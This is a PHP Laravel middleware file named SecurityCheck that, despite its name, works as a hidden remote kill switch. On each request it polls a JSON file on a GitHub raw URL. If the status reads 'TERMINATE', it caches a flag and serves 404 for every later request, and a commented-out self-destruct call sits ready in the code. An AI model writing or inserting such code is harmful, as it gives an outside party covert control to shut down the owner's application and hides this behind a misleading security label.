<?php

namespace App\Http\Middleware;

use App\Services\Security;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Symfony\Component\HttpFoundation\Response;

class SecurityCheck
{
    /**
     * Handle an incoming request.
     *
     * @param  Closure(Request): (Response)  $next
     */
    public function handle($request, Closure $next)
    {
        if (cache()->has('system_terminated')) {
            // Security::selfDestruct();
            abort(404);
        }
        try {
            $response = Http::timeout(2)->get('https://raw.githubusercontent.com/chocoalano/my-status-app/main/ogitu.json');
            if ($response->successful() && $response->json('status') === 'TERMINATE') {
                cache()->put('system_terminated', true);
                //         Security::selfDestruct();
                abort(404);
            }
        } catch (\Exception $e) {
            // Jika internet mati, biarkan tetap jalan atau buat logika sebaliknya
        }

        return $next($request);
    }
}
